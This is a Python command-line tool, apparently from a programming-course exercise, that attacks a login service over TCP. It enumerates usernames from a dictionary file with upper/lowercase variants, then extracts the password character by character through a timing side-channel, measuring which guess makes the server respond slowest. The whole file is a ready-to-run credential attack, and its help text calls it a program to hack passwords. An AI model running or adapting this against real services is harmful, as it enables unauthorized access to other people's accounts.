import argparse, socket, itertools, json, os
import time
from os.path import join as pjoin
import collections

class Request:
    LOGIN = "login"
    PASSWORD = "password"
    def __init__(self, login="", password=""):
        self.login = login
        self.password = password

    def dict(self):
        return {self.LOGIN: self.login, self.PASSWORD: self.password}

    def bytes(self):
        return bytes(json.dumps(self.dict()), 'utf-8')

class Response:
    SUCCESS = 'uccess!'
    WRONG_PSW = 'Wrong password!'
    WRONG_LOGIN = 'Wrong login!'
    MANY_ATTEMPTS = 'Too many attempts'
    EXCEPTION = 'Exception happened during login'

    @staticmethod
    def _check(need_string, response_string):
        result = json.loads(response_string)["result"]
        if need_string in result:
            return True
        return False

    @staticmethod
    def check_success(string):
        return Response._check(Response.SUCCESS, string)

    @staticmethod
    def check_wrong_pswd(string):
        return Response._check(Response.WRONG_PSW, string)

    @staticmethod
    def check_wrong_login(string):
        return Response._check(Response.WRONG_LOGIN, string)

class Socket(socket.socket):
    def __init__(self, host, port):
        self.host = host
        self.port = port
        super(Socket, self).__init__(socket.AF_INET, socket.SOCK_STREAM)
        self.connect((host, port))

    def __del__(self):
        if not self._closed:
            self.close()

    def check_login(self, login) -> bool:
        message = Request(login)
        self.sendall(message.bytes())
        response_str = self.recv(1024).decode('utf-8')
        if Response.check_wrong_pswd(response_str):
            return True
        else:
            return False

    def check_pswd(self, login, pswd) -> (int, bool):
        message = Request(login, pswd)
        self.sendall(message.bytes())

        start_time = time.perf_counter()
        response_str = self.recv(1024).decode('utf-8')
        end_time = time.perf_counter()
        delta_t = end_time - start_time

        if Response.check_success(response_str):
            return (delta_t, True)
        elif Response.check_wrong_pswd(response_str):
            return (delta_t, False)
        else:
            raise RuntimeError("Attempt to check password with invalid login")

    def autorize(self, login, pswd) -> bool:
        message = Request(login, pswd)
        self.sendall(message.bytes(), 'utf-8')
        response_str = self.recv(1024).decode('utf-8')
        if Response.check_success(response_str):
            return True
        else:
            return False

def gen_pswds(lenght):
    '''
    Generates all possible lowercase combinations of given lenght
    :param lenght: int
    :return: list
        list of possible combinations
    '''
    letters = [chr(x) for x in range(ord('a'), ord('z') + 1)]
    numbers = [str(x) for x in range(0, 10)]
    symbols = letters + numbers

    combinations = itertools.product(symbols, repeat=lenght)
    return map(lambda item: "".join(item), combinations)

def vary_pswds(pswd):
    '''
    Find all possible combinations of string: 0 - lowercase, 1 - uppercase
    :param pswd: str
    :return: list
        List of possible combinations
    '''
    combinations = [x for x in itertools.product([0, 1], repeat=len(pswd))]
    res = []
    for case in combinations:
        current_pswd = []
        for i, character in enumerate(pswd):
            current_pswd.append(character.upper() if case[i] else character.lower())
        res.append("".join(current_pswd))
    return res

def vary_logins(login):
    # use the same actions as for passwords
    return vary_pswds(login)

def try_login(sock, login):
    '''
    Try given login with upper-lower cases.

    :param sock: Socket
    :param login: str
    :return: bool
    '''
    logins = vary_logins(login)

    for l in logins:
        if sock.check_login(l):
            return True

    return False

def break_pswd(sock, login):
    '''
    Break passwords with time-based vulnerability
    :param sock: Socket
    :param login: str
    :return: str
        right password if found, else empty string
    '''
    letters = [chr(x) for x in range(ord('a'), ord('z') + 1)]
    letters.extend([chr(x) for x in range(ord('A'), ord('Z') + 1)])
    numbers = [str(x) for x in range(0, 10)]
    symbols = letters + numbers

    current_pswd = []
    response_times = []

    while len(current_pswd) < 100:
        current_pswd.append(0)
        response_times.clear()

        for symb in symbols:
            current_pswd[len(current_pswd) - 1] = symb
            resp_time, resp_res = sock.check_pswd(login, "".join(current_pswd))

            if resp_res:
                return "".join(current_pswd)
            else:
                response_times.append(resp_time)

        right_symb = response_times.index(max(response_times))
        current_pswd[len(current_pswd) - 1] = symbols[right_symb]

    return "".join(current_pswd)


if __name__ == "__main__":
    # pathes to list with most common logins and passwords
    PSWD_DICT_FILENAME = pjoin(os.path.dirname(__file__), "passwords.txt")
    LOGIN_DICT_FILENAME = pjoin(os.path.dirname(__file__), "logins.txt")

    parser = argparse.ArgumentParser(description="Program to hack the passwords. Usage: python hack.py IP PORT")
    parser.add_argument('ip', type=str)
    parser.add_argument('port', type=int)

    args = parser.parse_args()

    typical_logins = []
    try:
        with open(LOGIN_DICT_FILENAME, 'r') as f:
            typical_logins = f.read().splitlines()
    except:
        print("Something went wrong with login dictionary")

    # Find login, then password
    try:
        sock = Socket(args.ip, args.port)
        right_login = ""
        for login in typical_logins:
            if try_login(sock, login):
                right_login = login
                break
        right_pswd = ""
        right_pswd = break_pswd(sock, right_login)

    except ConnectionAbortedError:
        print("")
    except json.decoder.JSONDecodeError:
        print(f"Cant decode response")

    message = Request(right_login, right_pswd)
    print(json.dumps(message.dict()))



